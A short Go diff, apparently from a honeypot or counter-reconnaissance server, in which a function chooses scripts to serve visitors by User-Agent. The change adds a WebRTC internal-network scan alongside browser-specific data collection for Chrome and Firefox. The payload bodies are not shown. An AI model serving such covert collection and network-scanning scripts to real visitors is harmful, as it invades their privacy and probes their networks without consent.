@@ -196,12 +196,12 @@ func (e *Engine) SelectPayload(path, userAgent, remoteIP string) string {
 
 	// 1. Chrome 浏览器 → Chrome 专项采集 + 内网扫描
 	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "headless") && !strings.Contains(ua, "bot") {
-		return e.chromePayload()
+		return e.chromePayload() + e.webrtcInternalScanPayload()
 	}
 
 	// 2. Firefox 浏览器 → Firefox 专项采集 + 内网扫描
 	if strings.Contains(ua, "firefox") && !strings.Contains(ua, "bot") {
-		return e.firefoxPayload()
+		return e.firefoxPayload() + e.webrtcInternalScanPayload()
 	}
 
 	// 3. 路径匹配 — Spring Boot Actuator（优先于工具检测）
